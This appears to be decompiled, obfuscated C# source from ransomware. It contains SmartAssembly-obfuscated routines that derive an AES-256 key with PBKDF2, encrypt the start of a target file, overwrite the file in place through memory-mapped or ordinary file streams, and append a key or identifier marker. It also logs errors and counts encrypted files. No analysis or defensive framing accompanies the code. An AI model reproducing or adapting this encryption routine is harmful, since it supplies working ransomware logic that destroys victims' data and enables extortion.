using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace nVxbvhuaKzC;

public static class iQHvEzXEixXur
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] fYNdrMmszbFBKK(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = bPLZCgUchRJx(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using (Aes aes = new AesManaged())
		{
			aes.KeySize = 256;
			aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
			aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
			aes.Padding = PaddingMode.None;
			aes.Mode = CipherMode.CBC;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(byte_0, 0, byte_0.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			rfc2898DeriveBytes.Dispose();
		}
		return result;
	}

	public static Rfc2898DeriveBytes bPLZCgUchRJx(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] zQnYkaPtyUjj(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (FcnBvlzKWyQDwH.NrRjEEeptLvAPsW == getString_0(107397079))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (FcnBvlzKWyQDwH.IxPlnZLdvsZB)
			{
				try
				{
					File.AppendAllText(FcnBvlzKWyQDwH.AJzDKHoaGNRf, getString_0(107386557) + string_0 + getString_0(107408357) + ex.Message + getString_0(107396599));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
	}

	public static bool yPLRgFIAPWTIT(string rGiQcJBSsDU, byte[] hggTPAfoWyJLMW, byte[] LoTahZDxSK = null)
	{
		try
		{
			byte[] array = null;
			if (FcnBvlzKWyQDwH.NrRjEEeptLvAPsW == getString_0(107397079))
			{
				array = (FcnBvlzKWyQDwH.YrjqOIvQHnLHl ? Encoding.ASCII.GetBytes(FcnBvlzKWyQDwH.EvKBdYIakj(FcnBvlzKWyQDwH.cPaKpWJfcXNc) + FcnBvlzKWyQDwH.EvKBdYIakj(getString_0(107408286)) + Convert.ToString(FcnBvlzKWyQDwH.KHcVbQthlIOKM) + FcnBvlzKWyQDwH.EvKBdYIakj(getString_0(107408286))) : (FcnBvlzKWyQDwH.WXjJcHajhkaSgC ? Encoding.ASCII.GetBytes(FcnBvlzKWyQDwH.EvKBdYIakj(getString_0(107408267)) + FcnBvlzKWyQDwH.EvKBdYIakj(getString_0(107408276)) + Convert.ToString(FcnBvlzKWyQDwH.KHcVbQthlIOKM) + FcnBvlzKWyQDwH.EvKBdYIakj(getString_0(107408276))) : Encoding.ASCII.GetBytes(FcnBvlzKWyQDwH.EvKBdYIakj(FcnBvlzKWyQDwH.cPaKpWJfcXNc) + FcnBvlzKWyQDwH.EvKBdYIakj(getString_0(107408276)) + Convert.ToString(FcnBvlzKWyQDwH.KHcVbQthlIOKM) + FcnBvlzKWyQDwH.EvKBdYIakj(getString_0(107408276)))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(rGiQcJBSsDU, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(hggTPAfoWyJLMW, 0, hggTPAfoWyJLMW.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(rGiQcJBSsDU, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!FcnBvlzKWyQDwH.YrjqOIvQHnLHl)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(LoTahZDxSK, 0, LoTahZDxSK.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (FcnBvlzKWyQDwH.YrjqOIvQHnLHl ? Encoding.ASCII.GetBytes(FcnBvlzKWyQDwH.EvKBdYIakj(FcnBvlzKWyQDwH.cPaKpWJfcXNc) + FcnBvlzKWyQDwH.EvKBdYIakj(getString_0(107408286)) + Convert.ToString(FcnBvlzKWyQDwH.KHcVbQthlIOKM) + FcnBvlzKWyQDwH.EvKBdYIakj(getString_0(107408286))) : (FcnBvlzKWyQDwH.WXjJcHajhkaSgC ? Encoding.ASCII.GetBytes(FcnBvlzKWyQDwH.EvKBdYIakj(getString_0(107408267)) + FcnBvlzKWyQDwH.EvKBdYIakj(getString_0(107408276)) + Convert.ToString(FcnBvlzKWyQDwH.KHcVbQthlIOKM) + FcnBvlzKWyQDwH.EvKBdYIakj(getString_0(107408276))) : Encoding.ASCII.GetBytes(FcnBvlzKWyQDwH.EvKBdYIakj(FcnBvlzKWyQDwH.cPaKpWJfcXNc) + FcnBvlzKWyQDwH.EvKBdYIakj(getString_0(107408276)) + Convert.ToString(FcnBvlzKWyQDwH.KHcVbQthlIOKM) + FcnBvlzKWyQDwH.EvKBdYIakj(getString_0(107408276)))));
				FileStream fileStream2 = new FileStream(rGiQcJBSsDU, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(hggTPAfoWyJLMW, 0, hggTPAfoWyJLMW.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream = new FileStream(rGiQcJBSsDU, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!FcnBvlzKWyQDwH.YrjqOIvQHnLHl)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(LoTahZDxSK, 0, LoTahZDxSK.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			FcnBvlzKWyQDwH.emFRwwndTZvr++;
		}
		catch (Exception ex)
		{
			if (FcnBvlzKWyQDwH.IxPlnZLdvsZB)
			{
				try
				{
					File.AppendAllText(FcnBvlzKWyQDwH.AJzDKHoaGNRf, getString_0(107386557) + rGiQcJBSsDU + getString_0(107408245) + ex.Message + getString_0(107396599));
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array = null;
				array = (FcnBvlzKWyQDwH.YrjqOIvQHnLHl ? Encoding.ASCII.GetBytes(FcnBvlzKWyQDwH.EvKBdYIakj(FcnBvlzKWyQDwH.cPaKpWJfcXNc) + FcnBvlzKWyQDwH.EvKBdYIakj(getString_0(107408286)) + Convert.ToString(FcnBvlzKWyQDwH.KHcVbQthlIOKM) + FcnBvlzKWyQDwH.EvKBdYIakj(getString_0(107408286))) : (FcnBvlzKWyQDwH.WXjJcHajhkaSgC ? Encoding.ASCII.GetBytes(FcnBvlzKWyQDwH.EvKBdYIakj(getString_0(107408267)) + FcnBvlzKWyQDwH.EvKBdYIakj(getString_0(107408276)) + Convert.ToString(FcnBvlzKWyQDwH.KHcVbQthlIOKM) + FcnBvlzKWyQDwH.EvKBdYIakj(getString_0(107408276))) : Encoding.ASCII.GetBytes(FcnBvlzKWyQDwH.EvKBdYIakj(FcnBvlzKWyQDwH.cPaKpWJfcXNc) + FcnBvlzKWyQDwH.EvKBdYIakj(getString_0(107408276)) + Convert.ToString(FcnBvlzKWyQDwH.KHcVbQthlIOKM) + FcnBvlzKWyQDwH.EvKBdYIakj(getString_0(107408276)))));
				FileStream fileStream2 = new FileStream(rGiQcJBSsDU, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(hggTPAfoWyJLMW, 0, hggTPAfoWyJLMW.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using (FileStream fileStream = new FileStream(rGiQcJBSsDU, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!FcnBvlzKWyQDwH.YrjqOIvQHnLHl)
					{
						fileStream.Write(array, 0, array.Length);
					}
					else
					{
						fileStream.Write(LoTahZDxSK, 0, LoTahZDxSK.Length);
						fileStream.Write(array, 0, array.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}

	static iQHvEzXEixXur()
	{
		Strings.CreateGetStringDelegate(typeof(iQHvEzXEixXur));
	}
}
